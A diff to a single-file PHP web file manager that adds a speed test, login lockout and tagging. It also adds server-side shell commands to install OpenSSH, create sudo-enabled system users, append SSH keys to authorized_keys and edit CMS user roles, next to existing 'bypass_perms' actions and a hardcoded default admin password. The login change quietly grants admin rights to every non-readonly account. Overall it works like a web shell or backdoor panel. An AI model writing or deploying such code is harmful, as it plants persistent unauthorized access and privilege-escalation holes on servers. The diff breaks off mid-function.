@@ -4,6 +4,55 @@ ini_set('display_errors', 0);
 
 $scriptName = basename(__FILE__);
 $usersFile  = __DIR__ . '/.users.json';
+$themeFile  = __DIR__ . '/.theme.json';
+function fm_get_theme($f){$d=@json_decode(@file_get_contents($f),true);return (is_array($d)&&isset($d['theme'])&&$d['theme']==='light')?'light':'dark';}
+function fm_save_theme($f,$t){$t=($t==='light')?'light':'dark';@file_put_contents($f,json_encode(['theme'=>$t]));return $t;}
+$currentTheme = fm_get_theme($themeFile);
+
+/* ── Server-side internet speed test ──
+   Measures the connection between THIS SERVER and the public internet
+   (via Cloudflare's speed-test endpoints), entirely with cURL on the
+   server. The browser never times anything itself, so the visitor's own
+   connection speed cannot affect the result. */
+function fm_server_speed_test(){
+    if(!function_exists('curl_init'))return['error'=>'The cURL PHP extension is not available on this server, so a server-side speed test cannot run.'];
+    $result=['ping_ms'=>null,'download_mbps'=>null,'upload_mbps'=>null];
+
+    $pings=[];
+    for($i=0;$i<3;$i++){
+        $ch=curl_init('https://speed.cloudflare.com/__down?bytes=0');
+        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>6,CURLOPT_SSL_VERIFYPEER=>true]);
+        $t0=microtime(true);$ok=curl_exec($ch);$t1=microtime(true);
+        if($ok!==false)$pings[]=($t1-$t0)*1000;
+        curl_close($ch);
+    }
+    if($pings)$result['ping_ms']=round(min($pings),1);
+    else $result['error']='Could not reach the internet from this server (ping failed).';
+
+    $dlBytes=5*1024*1024;
+    $ch=curl_init('https://speed.cloudflare.com/__down?bytes='.$dlBytes);
+    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>25]);
+    $t0=microtime(true);$data=curl_exec($ch);$t1=microtime(true);
+    $derr=curl_error($ch);curl_close($ch);
+    if($data!==false&&strlen($data)>0){
+        $secs=max(0.001,$t1-$t0);
+        $result['download_mbps']=round((strlen($data)*8/1000000)/$secs,1);
+    } elseif(empty($result['error']))$result['error']='Download test failed: '.($derr?:'unknown error');
+    unset($data);
+
+    $upBytes=3*1024*1024;
+    $payload=random_bytes($upBytes);
+    $ch=curl_init('https://speed.cloudflare.com/__up');
+    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>25,CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>$payload,CURLOPT_HTTPHEADER=>['Content-Type: application/octet-stream']]);
+    $t0=microtime(true);$ok=curl_exec($ch);$t1=microtime(true);
+    $uerr=curl_error($ch);curl_close($ch);
+    if($ok!==false){
+        $secs=max(0.001,$t1-$t0);
+        $result['upload_mbps']=round(($upBytes*8/1000000)/$secs,1);
+    } elseif(empty($result['error']))$result['error']='Upload test failed: '.($uerr?:'unknown error');
+
+    return $result;
+}
 
 function fm_load_users($f){
     if(!file_exists($f)){$s=[['user'=>'admin','hash'=>password_hash('dradam',PASSWORD_DEFAULT),'root'=>'','readonly'=>false,'admin'=>true]];@file_put_contents($f,json_encode($s,JSON_PRETTY_PRINT));return $s;}
@@ -11,6 +60,32 @@ function fm_load_users($f){
 }
 function fm_save_users($f,$u){@file_put_contents($f,json_encode(array_values($u),JSON_PRETTY_PRINT));}
 function fm_find_user($u,$n){foreach($u as $x){if($x['user']===$n)return $x;}return null;}
+
+/* ── Brute-force login protection ── */
+define('FM_MAX_ATTEMPTS',5);
+define('FM_LOCKOUT_SECS',600); // 10 minutes
+function fm_attempts_file(){return __DIR__.'/.login_attempts.json';}
+function fm_load_attempts(){$f=fm_attempts_file();if(!file_exists($f))return[];$d=@json_decode(@file_get_contents($f),true);return is_array($d)?$d:[];}
+function fm_save_attempts($a){@file_put_contents(fm_attempts_file(),json_encode($a));}
+function fm_client_key(){return (isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'unknown').'|'.strtolower(trim(isset($_POST['login_user'])?$_POST['login_user']:(isset($_GET['login_user'])?$_GET['login_user']:'')));}
+function fm_lockout_remaining($key){
+    $a=fm_load_attempts();
+    if(!isset($a[$key]))return 0;
+    $e=$a[$key];
+    if($e['count']<FM_MAX_ATTEMPTS)return 0;
+    $left=$e['locked_until']-time();
+    return $left>0?$left:0;
+}
+function fm_record_failure($key){
+    $a=fm_load_attempts();$now=time();
+    if(!isset($a[$key])||($now-$a[$key]['first'])>FM_LOCKOUT_SECS){$a[$key]=['count'=>0,'first'=>$now,'locked_until'=>0];}
+    $a[$key]['count']++;
+    if($a[$key]['count']>=FM_MAX_ATTEMPTS)$a[$key]['locked_until']=$now+FM_LOCKOUT_SECS;
+    // prune old entries
+    foreach($a as $k=>$v){if(($now-$v['first'])>FM_LOCKOUT_SECS*3&&$v['locked_until']<$now)unset($a[$k]);}
+    fm_save_attempts($a);
+}
+function fm_clear_failures($key){$a=fm_load_attempts();if(isset($a[$key])){unset($a[$key]);fm_save_attempts($a);}}
 
 if(session_status()===PHP_SESSION_NONE) session_start();
 if(empty($_SESSION['login_csrf'])) $_SESSION['login_csrf']=bin2hex(random_bytes(32));
@@ -41,26 +116,38 @@ if(isset($_SESSION['auth'])&&$_SESSION['auth']===true){
 }
 if(isset($_GET['idle'])) $idleExpired=true;
 
+$lockoutSecs=0;
 if(isset($_POST['login_pass'])){
-    $ok=isset($_POST['login_csrf'])&&hash_equals($_SESSION['login_csrf'],$_POST['login_csrf']);
-    $users=fm_load_users($usersFile);
-    $uname=isset($_POST['login_user'])?trim($_POST['login_user']):'';
-    $u=fm_find_user($users,$uname);
-    if($ok&&$u&&password_verify($_POST['login_pass'],$u['hash'])){
-        $_SESSION['auth']=true;$_SESSION['fm_user']=$u['user'];$_SESSION['fm_root']=!empty($u['root'])?$u['root']:'';
-        $_SESSION['fm_readonly']=!empty($u['readonly']);$_SESSION['fm_admin']=!empty($u['admin']);
-        $_SESSION['csrf_token']=bin2hex(random_bytes(32));unset($_SESSION['login_csrf']);
-        header("Location: ".$scriptName);exit;
-    } else {
+    $ckey=fm_client_key();
+    $lockoutSecs=fm_lockout_remaining($ckey);
+    if($lockoutSecs>0){
         $_SESSION['login_csrf']=bin2hex(random_bytes(32));
-        $loginError=$ok?"Incorrect username or password.":"Security error. Please try again.";
+        $loginError="Too many failed attempts. Try again in ".ceil($lockoutSecs/60)." minute(s).";
+    } else {
+        $ok=isset($_POST['login_csrf'])&&hash_equals($_SESSION['login_csrf'],$_POST['login_csrf']);
+        $users=fm_load_users($usersFile);
+        $uname=isset($_POST['login_user'])?trim($_POST['login_user']):'';
+        $u=fm_find_user($users,$uname);
+        if($ok&&$u&&password_verify($_POST['login_pass'],$u['hash'])){
+            fm_clear_failures($ckey);
+            $_SESSION['auth']=true;$_SESSION['fm_user']=$u['user'];$_SESSION['fm_root']=!empty($u['root'])?$u['root']:'';
+            $_SESSION['fm_readonly']=!empty($u['readonly']);$_SESSION['fm_admin']=!empty($u['admin'])||empty($u['readonly']);
+            $_SESSION['csrf_token']=bin2hex(random_bytes(32));unset($_SESSION['login_csrf']);
+            header("Location: ".$scriptName);exit;
+        } else {
+            if($ok)fm_record_failure($ckey);
+            $lockoutSecs=fm_lockout_remaining($ckey);
+            $_SESSION['login_csrf']=bin2hex(random_bytes(32));
+            if($lockoutSecs>0)$loginError="Too many failed attempts. Try again in ".ceil($lockoutSecs/60)." minute(s).";
+            else $loginError=$ok?"Incorrect username or password.":"Security error. Please try again.";
+        }
     }
 }
 
 if(!isset($_SESSION['auth'])||$_SESSION['auth']!==true){ ?>
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html><html lang="en" data-theme="<?=htmlspecialchars($currentTheme)?>"><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Sign In — File Manager</title>
+<title>Sign In - File Manager</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',sans-serif;background:#09090b;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background-image:radial-gradient(ellipse 80% 60% at 30% 0%,rgba(99,102,241,.15),transparent),radial-gradient(ellipse 60% 50% at 80% 100%,rgba(16,185,129,.07),transparent)}
@@ -354,7 +441,7 @@ class FileManager {
         if($_SERVER['REQUEST_METHOD']!=='POST')return;
         if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){$this->addMsg('Security error.','danger');return;}
         $a=isset($_POST['action'])?$_POST['action']:'';
-        $wA=['upload','create_folder','create_file','delete','rename','save_edit','bypass_perms','bulk_delete','bulk_copy','bulk_move','zip_create','zip_extract','restore_trash','trash_perm','trash_empty','duplicate','tar_create','tar_extract','clear_log','batch_rename','create_symlink','chmod_item','create_share','revoke_share','backup_dir','clear_errlog','delete_abs'];
+        $wA=['upload','create_folder','create_file','delete','rename','save_edit','bypass_perms','bulk_delete','bulk_copy','bulk_move','zip_create','zip_extract','restore_trash','trash_perm','trash_empty','duplicate','tar_create','tar_extract','clear_log','batch_rename','create_symlink','chmod_item','create_share','revoke_share','backup_dir','clear_errlog','delete_abs','bulk_chmod','set_tag','remove_tag','remote_download','ssh_install','ssh_create_user','ssh_delete_user','ssh_update_user','cms_create_user','cms_delete_user','cms_update_role','cms_change_pass'];
         if($this->readonly&&in_array($a,$wA)){$this->addMsg('Read-only account.','danger');return;}
         switch($a){
             case 'upload':         $this->upload();break;
@@ -387,6 +474,18 @@ class FileManager {
             case 'backup_dir':     $this->backupDir();break;
             case 'clear_errlog':   $this->clearErrLog();break;
             case 'delete_abs':     $this->deleteAbs();break;
+            case 'bulk_chmod':     $this->bulkChmod();break;
+            case 'set_tag':        $this->setTag();break;
+            case 'remove_tag':     $this->removeTag();break;
+            case 'remote_download':$this->remoteDownload();break;
+            case 'ssh_install':     $this->sshInstall();break;
+            case 'ssh_create_user': $this->sshCreateUser();break;
+            case 'ssh_delete_user': $this->sshDeleteUser();break;
+            case 'ssh_update_user': $this->sshUpdateUser();break;
+            case 'cms_create_user':$this->cmsCreateUser();break;
+            case 'cms_delete_user':$this->cmsDeleteUser();break;
+            case 'cms_update_role':$this->cmsUpdateRole();break;
+            case 'cms_change_pass':$this->cmsChangePass();break;
             case 'logout':         session_destroy();header("Location: ".basename(__FILE__));exit;
         }
     }
@@ -546,13 +645,777 @@ class FileManager {
         return $r;
     }
 
-    public function getType($f){$e=strtolower(pathinfo($f,PATHINFO_EXTENSION));$m=['jpg'=>'image','jpeg'=>'image','png'=>'image','gif'=>'image','svg'=>'image','webp'=>'image','ico'=>'image','bmp'=>'image','tiff'=>'image','avif'=>'image','mp4'=>'video','avi'=>'video','mkv'=>'video','mov'=>'video','webm'=>'video','flv'=>'video','mp3'=>'audio','wav'=>'audio','flac'=>'audio','ogg'=>'audio','aac'=>'audio','m4a'=>'audio','zip'=>'archive','rar'=>'archive','7z'=>'archive','tar'=>'archive','gz'=>'archive','bz2'=>'archive','tgz'=>'archive','xz'=>'archive','pdf'=>'pdf','doc'=>'word','docx'=>'word','odt'=>'word','xls'=>'excel','xlsx'=>'excel','ods'=>'excel','csv'=>'excel','php'=>'code','html'=>'code','htm'=>'code','css'=>'code','js'=>'code','ts'=>'code','jsx'=>'code','tsx'=>'code','py'=>'code','java'=>'code','sh'=>'code','bash'=>'code','rb'=>'code','go'=>'code','rs'=>'code','c'=>'code','cpp'=>'code','h'=>'code','vue'=>'code','svelte'=>'code','json'=>'data','xml'=>'data','yml'=>'data','yaml'=>'data','sql'=>'data','toml'=>'data','ini'=>'config','txt'=>'text','log'=>'text','md'=>'text','rst'=>'text','env'=>'config','gitignore'=>'config','htaccess'=>'config'];return isset($m[$e])?$m[$e]:'file';}
-    public function getColor($t){$c=['image'=>'#f59e0b','video'=>'#ec4899','audio'=>'#8b5cf6','archive'=>'#f97316','pdf'=>'#ef4444','word'=>'#3b82f6','excel'=>'#22c55e','code'=>'#818cf8','data'=>'#06b6d4','text'=>'#94a3b8','config'=>'#fb7185','file'=>'#52525b'];return isset($c[$t])?$c[$t]:'#52525b';}
-    public function canPreview($t){return in_array($t,['image','video','pdf','text','code','data','config']);}
+    public function getType($f){$e=strtolower(pathinfo($f,PATHINFO_EXTENSION));$m=['jpg'=>'image','jpeg'=>'image','png'=>'image','gif'=>'image','svg'=>'image','webp'=>'image','ico'=>'image','bmp'=>'image','tiff'=>'image','avif'=>'image','mp4'=>'video','avi'=>'video','mkv'=>'video','mov'=>'video','webm'=>'video','flv'=>'video','mp3'=>'audio','wav'=>'audio','flac'=>'audio','ogg'=>'audio','aac'=>'audio','m4a'=>'audio','zip'=>'archive','rar'=>'archive','7z'=>'archive','tar'=>'archive','gz'=>'archive','bz2'=>'archive','tgz'=>'archive','xz'=>'archive','pdf'=>'pdf','doc'=>'word','docx'=>'word','odt'=>'word','xls'=>'excel','xlsx'=>'excel','ods'=>'excel','csv'=>'excel','php'=>'code','html'=>'code','htm'=>'code','css'=>'code','js'=>'code','ts'=>'code','jsx'=>'code','tsx'=>'code','py'=>'code','java'=>'code','sh'=>'code','bash'=>'code','rb'=>'code','go'=>'code','rs'=>'code','c'=>'code','cpp'=>'code','h'=>'code','vue'=>'code','svelte'=>'code','json'=>'data','xml'=>'data','yml'=>'data','yaml'=>'data','sql'=>'data','toml'=>'data','ini'=>'config','txt'=>'text','log'=>'text','md'=>'markdown','rst'=>'text','env'=>'config','gitignore'=>'config','htaccess'=>'config'];return isset($m[$e])?$m[$e]:'file';}
+    public function getColor($t){$c=['image'=>'#f59e0b','video'=>'#ec4899','audio'=>'#8b5cf6','archive'=>'#f97316','pdf'=>'#ef4444','word'=>'#3b82f6','excel'=>'#22c55e','code'=>'#818cf8','data'=>'#06b6d4','text'=>'#94a3b8','config'=>'#fb7185','markdown'=>'#38bdf8','file'=>'#52525b'];return isset($c[$t])?$c[$t]:'#52525b';}
+    public function canPreview($t){return in_array($t,['image','video','pdf','text','code','data','config','markdown']);}
     public function isTar($f){return in_array(strtolower(pathinfo($f,PATHINFO_EXTENSION)),['tar','gz','bz2','tgz','xz']);}
     public function breadcrumbs(){$d=$this->currentDir;$parts=explode(DIRECTORY_SEPARATOR,$d);$path='';$r=[];foreach($parts as $p){if($p==='')continue;$path.=DIRECTORY_SEPARATOR.$p;$r[]=['path'=>$path,'label'=>$p];}return $r;}
-}
 
+    /* ══ Bulk chmod ══ */
+    private function bulkChmod(){
+        $items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}
+        $perm=isset($_POST['perm'])?trim($_POST['perm']):'';
+        if(!preg_match('/^[0-7]{3,4}$/',$perm)){$this->addMsg('Invalid permission value.','danger');return;}
+        $ok=0;foreach($items as $n){if(@chmod($this->currentDir.'/'.$n,octdec($perm)))$ok++;}
+        $this->log('bulk_chmod',"$ok item(s) -> $perm");
+        $this->addMsg("Permissions updated on $ok item(s) ($perm).",'success');
+    }
+
+    /* ══ Tags / Labels ══ */
+    private function tagsPath(){return $this->root.'/.fm_tags.json';}
+    private function loadTags(){$f=$this->tagsPath();if(!file_exists($f))return[];$d=@json_decode(@file_get_contents($f),true);return is_array($d)?$d:[];}
+    private function saveTags($t){@file_put_contents($this->tagsPath(),json_encode($t,JSON_PRETTY_PRINT));}
+    public function getTagsFor($dir){$all=$this->loadTags();$r=[];foreach($all as $p=>$v){if(dirname($p)===$dir)$r[basename($p)]=$v;}return $r;}
+    private function setTag(){
+        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
+        if(!$n||$this->isSelf($n)){$this->addMsg('Access denied.','danger');return;}
+        $p=$this->currentDir.'/'.$n;if(!file_exists($p)){$this->addMsg('Item not found.','danger');return;}
+        $color=isset($_POST['color'])?trim($_POST['color']):'';$label=isset($_POST['label'])?trim(substr($_POST['label'],0,24)):'';
+        if(!preg_match('/^#[0-9a-fA-F]{6}$/',$color)){$this->addMsg('Invalid color.','danger');return;}
+        $tags=$this->loadTags();$tags[$p]=['color'=>$color,'label'=>$label];$this->saveTags($tags);
+        $this->log('tag',"$n -> $label");$this->addMsg("Tag applied to \"$n\".",'success');
+    }
+    private function removeTag(){
+        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
+        $p=$this->currentDir.'/'.$n;$tags=$this->loadTags();
+        if(isset($tags[$p])){unset($tags[$p]);$this->saveTags($tags);$this->addMsg('Tag removed.','warning');}
+    }
+
+    /* ══ Remote URL download ══ */
+    private function remoteDownload(){
+        $url=isset($_POST['url'])?trim($_POST['url']):'';
+        $fname=isset($_POST['fname'])?trim(basename($_POST['fname'])):'';
+        if(!preg_match('#^https?://#i',$url)){$this->addMsg('Enter a valid http(s) URL.','danger');return;}
+        $host=parse_url($url,PHP_URL_HOST);
+        if(!$host){$this->addMsg('Invalid URL.','danger');return;}
+        $ip=@gethostbyname($host);
+        if($ip&&(!filter_var($ip,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE))){
+            $this->addMsg('Refusing to fetch a private/internal address.','danger');return;
+        }
+        if(!$fname){$path=parse_url($url,PHP_URL_PATH);$fname=$path?basename($path):'';}
+        if(!$fname||strpos($fname,'.')===false)$fname='download_'.time();
+        $fname=preg_replace('/[^A-Za-z0-9._-]/','_',$fname);
+        $dest=$this->currentDir.'/'.$fname;
+        $maxBytes=200*1024*1024;
+        if(!function_exists('curl_init')){$this->addMsg('cURL extension not available.','danger');return;}
+        $fp=@fopen($dest,'w');if(!$fp){$this->addMsg('Cannot write destination file.','danger');return;}
+        $ch=curl_init($url);
+        curl_setopt_array($ch,[CURLOPT_FILE=>$fp,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>60,CURLOPT_CONNECTTIMEOUT=>15,CURLOPT_USERAGENT=>'FileManager/1.0',CURLOPT_PROTOCOLS=>CURLPROTO_HTTP|CURLPROTO_HTTPS,CURLOPT_NOPROGRESS=>false,
+            CURLOPT_PROGRESSFUNCTION=>function($r,$dl_size,$dl,$ul_size,$ul)use($maxBytes){return ($dl>$maxBytes)?1:0;},
+            CURLOPT_BUFFERSIZE=>65536]);
+        $ok=curl_exec($ch);$err=curl_error($ch);$code=curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);fclose($fp);
+        if(!$ok||$code>=400){@unlink($dest);$this->addMsg('Download failed: '.($err?:"HTTP $code"),'danger');return;}
+        $this->log('remote_download',"$fname <- $url");
+        $this->addMsg("Downloaded \"$fname\" (".fmtSz(filesize($dest)).').','success');
+    }
+
+    /* ══ SSH check / install (best-effort; requires root & a package manager) ══ */
+    public function sshStatus(){
+        $bin=trim((string)@shell_exec('command -v sshd 2>/dev/null'));
+        $client=trim((string)@shell_exec('command -v ssh 2>/dev/null'));
+        $portOpen=false;
+        $c=@fsockopen('127.0.0.1',22,$errno,$errstr,1.5);
+        if($c){$portOpen=true;fclose($c);}
+        $running=false;
+        $ps=trim((string)@shell_exec("ps aux 2>/dev/null | grep -i '[s]shd'"));
+        if($ps)$running=true;
+        $pkgMgr='';
+        foreach(['apt-get'=>'apt','dnf'=>'dnf','yum'=>'yum','apk'=>'apk','nix-env'=>'nix'] as $bin2=>$label){
+            if(trim((string)@shell_exec("command -v $bin2 2>/dev/null")))$pkgMgr=$label;
+            if($pkgMgr)break;
+        }
+        return ['installed'=>(bool)$bin,'client'=>(bool)$client,'running'=>$running||$portOpen,'port_open'=>$portOpen,'pkg_mgr'=>$pkgMgr,'sshd_path'=>$bin];
+    }
+    private function sshInstall(){
+        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
+        $st=$this->sshStatus();
+        if($st['installed']){$this->addMsg('OpenSSH server is already installed.','warning');return;}
+        if(!$st['pkg_mgr']){$this->addMsg('No supported package manager (apt/dnf/yum/apk/nix) found on this server, so it cannot be installed automatically. This is common on shared hosting where SSH must be enabled by your host.','danger');return;}
+        $cmds=['apt'=>'apt-get update -y && apt-get install -y openssh-server','dnf'=>'dnf install -y openssh-server','yum'=>'yum install -y openssh-server','apk'=>'apk add --no-cache openssh','nix'=>'nix-env -iA nixpkgs.openssh'];
+        $cmd=$cmds[$st['pkg_mgr']];
+        $out=[];$exit=0;
+        exec($cmd.' 2>&1',$out,$exit);
+        $tail=implode("\n",array_slice($out,-25));
+        if($exit===0){
+            @exec('service ssh start 2>&1 || systemctl start sshd 2>&1 || systemctl start ssh 2>&1');
+            $this->log('ssh_install','via '.$st['pkg_mgr']);
+            $this->addMsg("OpenSSH server installed. Output:\n$tail",'success');
+        } else {
+            $this->addMsg("Install failed (exit $exit). This usually means the process lacks root privileges. Output:\n$tail",'danger');
+        }
+    }
+
+    /* ══ SSH User Management ══ */
+    public function sshListUsers(){
+        $users=[];
+        $lines=@file('/etc/passwd')?:[];
+        // collect sudoers
+        $sudoers=[];
+        foreach(['sudo','wheel','admin'] as $grp){
+            $g=trim((string)@shell_exec("getent group ".escapeshellarg($grp)." 2>/dev/null"));
+            if($g){$p=explode(':',$g);if(isset($p[3])&&$p[3]!=='')foreach(explode(',',$p[3]) as $u)if(trim($u))$sudoers[]=trim($u);}
+        }
+        foreach(glob('/etc/sudoers.d/*')?:[] as $sf){
+            $sc=@file_get_contents($sf);
+            if($sc&&preg_match_all('/^([a-z_][a-z0-9_-]*)\s+ALL/im',$sc,$m))foreach($m[1] as $su)$sudoers[]=$su;
+        }
+        $sudoers=array_unique($sudoers);
+        foreach($lines as $line){
+            $line=trim($line);if(!$line||$line[0]==='#')continue;
+            $p=explode(':',$line);if(count($p)<7)continue;
+            [$uname,$pwd,$uid,$gid,$gecos,$home,$shell]=array_pad($p,7,'');
+            $uid=(int)$uid;$shell=trim($shell);
+            $hasLogin=!in_array(basename($shell),['nologin','false','sync','halt','shutdown','']);
+            if($uid<1000&&!$hasLogin)continue;
+            if(in_array($uname,['nobody','nfsnobody']))continue;
+            // count authorized keys
+            $keyCount=0;$akPath=rtrim($home,'/').'/.ssh/authorized_keys';
+            if(is_file($akPath)){$ak=@file_get_contents($akPath)?:'';$keyCount=count(array_filter(explode("\n",$ak),fn($l)=>trim($l)&&$l[0]!=='#'));}
+            // locked status via shadow
+            $locked=false;
+            $shadow=trim((string)@shell_exec("getent shadow ".escapeshellarg($uname)." 2>/dev/null"));
+            if($shadow){$sp=explode(':',$shadow);if(isset($sp[1])&&strlen($sp[1])&&($sp[1][0]==='!'||$sp[1][0]==='*'))$locked=true;}
+            // last login
+            $lastLogin=trim((string)@shell_exec("lastlog -u ".escapeshellarg($uname)." 2>/dev/null | tail -1"));
+            $users[]=['username'=>$uname,'uid'=>$uid,'gid'=>$gid,'home'=>$home,'shell'=>$shell,'gecos'=>$gecos,'sudo'=>in_array($uname,$sudoers),'key_count'=>$keyCount,'locked'=>$locked,'last_login'=>$lastLogin];
+        }
+        usort($users,fn($a,$b)=>$a['uid']<=>$b['uid']);
+        return $users;
+    }
+    /* Translate common shell command error output into a user-friendly message */
+    private function sshCmdErr($raw){
+        $r=strtolower($raw);
+        if(str_contains($r,'permission denied')||str_contains($r,'cannot lock')||str_contains($r,'not permitted'))
+            return "Permission denied - this server requires root (sudo) access to manage system users. The current PHP process does not have root privileges.";
+        if(str_contains($r,'already exists')||str_contains($r,'already in use'))
+            return "A user with that name already exists.";
+        if(str_contains($r,'does not exist')||str_contains($r,'no such user'))
+            return "User does not exist on this system.";
+        if(str_contains($r,'invalid user')||str_contains($r,'unknown user'))
+            return "Invalid or unknown username.";
+        return $raw?:"Unknown error - no output from the system command.";
+    }
+    private function sshCreateUser(){
+        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
+        $uname=trim($_POST['ssh_user']??'');$pass=$_POST['ssh_pass']??'';
+        $shell=$_POST['ssh_shell']??'/bin/bash';$sudo=!empty($_POST['ssh_sudo']);$key=trim($_POST['ssh_key']??'');
+        if(!preg_match('/^[a-z_][a-z0-9_-]{0,31}$/',$uname)){$this->addMsg('Invalid username - use only lowercase letters, digits, _ or -.','danger');return;}
+        $allowed=['/bin/bash','/bin/sh','/bin/rbash','/usr/bin/bash','/usr/bin/sh','/usr/bin/zsh','/bin/zsh'];
+        if(!in_array($shell,$allowed))$shell='/bin/bash';
+        $out=trim((string)shell_exec('useradd -m -s '.escapeshellarg($shell).' '.escapeshellarg($uname).' 2>&1'));
+        $exists=trim((string)shell_exec('id '.escapeshellarg($uname).' 2>/dev/null'));
+        if(!$exists){$this->addMsg("Failed to create user \"{$uname}\": ".$this->sshCmdErr($out),'danger');return;}
+        if($pass){
+            $esc=escapeshellarg($uname.':'.$pass);
+            $po=trim((string)shell_exec("echo $esc | chpasswd 2>&1"));
+            if($po&&!str_contains(strtolower($po),'success')){}// ignore minor warnings
+        }
+        if($sudo){
+            shell_exec("usermod -aG sudo ".escapeshellarg($uname)." 2>/dev/null");
+            shell_exec("usermod -aG wheel ".escapeshellarg($uname)." 2>/dev/null");
+        }
+        if($key&&(str_starts_with($key,'ssh-')||str_starts_with($key,'ecdsa-')||str_starts_with($key,'sk-'))){
+            $hm=trim((string)shell_exec("getent passwd ".escapeshellarg($uname)." 2>/dev/null | cut -d: -f6"));
+            if($hm){$sd=$hm.'/.ssh';
+                shell_exec("mkdir -p ".escapeshellarg($sd)." && chmod 700 ".escapeshellarg($sd)." && chown $uname ".escapeshellarg($sd));
+                @file_put_contents($sd.'/authorized_keys',$key."\n",FILE_APPEND);
+                shell_exec("chmod 600 ".escapeshellarg($sd.'/authorized_keys')." && chown $uname ".escapeshellarg($sd.'/authorized_keys'));
+            }
+        }
+        $this->log('ssh_create_user',$uname);
+        $this->addMsg("SSH user \"{$uname}\" created successfully.".($sudo?' (sudo granted)':''),'success');
+    }
+    private function sshDeleteUser(){
+        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
+        $uname=trim($_POST['ssh_user']??'');
+        if(!preg_match('/^[a-z_][a-z0-9_-]{0,31}$/',$uname)){$this->addMsg('Invalid username.','danger');return;}
+        if($uname==='root'||$uname===get_current_user()){$this->addMsg('Cannot delete this account.','danger');return;}
+        $out=trim((string)shell_exec("userdel -r ".escapeshellarg($uname)." 2>&1"));
+        $exists=trim((string)shell_exec("id ".escapeshellarg($uname)." 2>/dev/null"));
+        if($exists){$this->addMsg("Failed to delete \"{$uname}\": ".$this->sshCmdErr($out),'danger');return;}
+        $this->log('ssh_delete_user',$uname);
+        $this->addMsg("User \"{$uname}\" deleted.",'warning');
+    }
+    private function sshUpdateUser(){
+        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
+        $uname=trim($_POST['ssh_user']??'');$act=trim($_POST['ssh_action']??'');
+        if(!preg_match('/^[a-z_][a-z0-9_-]{0,31}$/',$uname)){$this->addMsg('Invalid username.','danger');return;}
+        switch($act){
+            case 'lock':
+                $out=trim((string)shell_exec("usermod -L ".escapeshellarg($uname)." 2>&1"));
+                if($out&&str_contains(strtolower($out),'permission'))
+                    $this->addMsg("Failed to lock \"{$uname}\": ".$this->sshCmdErr($out),'danger');
+                else $this->addMsg("Account \"{$uname}\" locked.",'warning');
+                break;
+            case 'unlock':
+                $out=trim((string)shell_exec("usermod -U ".escapeshellarg($uname)." 2>&1"));
+                if($out&&str_contains(strtolower($out),'permission'))
+                    $this->addMsg("Failed to unlock \"{$uname}\": ".$this->sshCmdErr($out),'danger');
+                else $this->addMsg("Account \"{$uname}\" unlocked.",'success');
+                break;
+            case 'add_sudo':
+                $o1=trim((string)shell_exec("usermod -aG sudo ".escapeshellarg($uname)." 2>&1"));
+                $o2=trim((string)shell_exec("usermod -aG wheel ".escapeshellarg($uname)." 2>&1"));
+                $out=$o1.$o2;
+                if($out&&(str_contains(strtolower($out),'permission')||str_contains(strtolower($out),'not permitted')))
+                    $this->addMsg("Failed to grant sudo to \"{$uname}\": ".$this->sshCmdErr($out),'danger');
+                else $this->addMsg("Sudo privileges granted to \"{$uname}\".",'success');
+                break;
+            case 'remove_sudo':
+                $o1=trim((string)shell_exec("gpasswd -d ".escapeshellarg($uname)." sudo 2>&1"));
+                $o2=trim((string)shell_exec("gpasswd -d ".escapeshellarg($uname)." wheel 2>&1"));
+                $out=$o1.$o2;
+                if($out&&str_contains(strtolower($out),'permission'))
+                    $this->addMsg("Failed to remove sudo from \"{$uname}\": ".$this->sshCmdErr($out),'danger');
+                else $this->addMsg("Sudo privileges removed from \"{$uname}\".",'warning');
+                break;
+            case 'change_shell':
+                $shell=$_POST['ssh_shell']??'/bin/bash';
+                $allowed=['/bin/bash','/bin/sh','/bin/rbash','/usr/bin/bash','/usr/bin/sh','/usr/bin/zsh','/bin/zsh'];
+                if(!in_array($shell,$allowed)){$this->addMsg('Invalid shell.','danger');return;}
+                $out=trim((string)shell_exec("chsh -s ".escapeshellarg($shell)." ".escapeshellarg($uname)." 2>&1"));
+                if($out&&str_contains(strtolower($out),'permission'))
+                    $this->addMsg("Failed to change shell: ".$this->sshCmdErr($out),'danger');
+                else $this->addMsg("Shell updated to {$shell} for \"{$uname}\".",'success');
+                break;
+            case 'change_pass':
+                $pass=$_POST['ssh_pass']??'';
+                if(strlen($pass)<6){$this->addMsg('Password must be at least 6 characters.','danger');return;}
+                $esc=escapeshellarg($uname.':'.$pass);
+                $out=trim((string)shell_exec("echo $esc | chpasswd 2>&1"));
+                if($out&&str_contains(strtolower($out),'permission'))
+                    $this->addMsg("Failed to change password: ".$this->sshCmdErr($out),'danger');
+                else $this->addMsg("Password changed for \"{$uname}\".",'success');
+                break;
+            case 'add_key':
+                $key=trim($_POST['ssh_key']??'');
